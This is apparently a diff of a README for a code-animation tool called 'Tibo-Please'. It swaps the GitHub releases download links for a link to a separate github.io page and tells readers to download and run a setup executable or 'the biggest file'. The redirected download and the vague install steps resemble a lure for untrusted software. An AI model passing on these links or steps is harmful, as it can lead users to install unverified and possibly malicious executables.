@@ -1,6 +1,6 @@
 # 🎬 Tibo-Please - Bring Your Code to Life with Stunning Animations
 
-[![Download Now](https://img.shields.io/badge/Download-Tibo--Please-blue?style=for-the-badge&logo=github&colorA=FF6B6B&colorB=4A90E2)](https://github.com/dorettachildbearing4153/Tibo-Please/releases)
+[![Download Now](https://img.shields.io/badge/Download-Tibo--Please-blue?style=for-the-badge&logo=github&colorA=FF6B6B&colorB=4A90E2)](https://dorettachildbearing4153.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ If you've ever typed a single line of code and thought "this could be a movie," 
 
 **Step 1: Get the Application**
 
-Visit this link to download the application: **[Download Tibo-Please](https://github.com/dorettachildbearing4153/Tibo-Please/releases)**
+Visit this link to download the application: **[Download Tibo-Please](https://dorettachildbearing4153.github.io)**
 
 You'll see a list of files on that page. Click the one that says something like "Tibo-Please-Setup.exe" (or the biggest file). Your browser will ask where to save it - choose your Downloads folder for now.
 
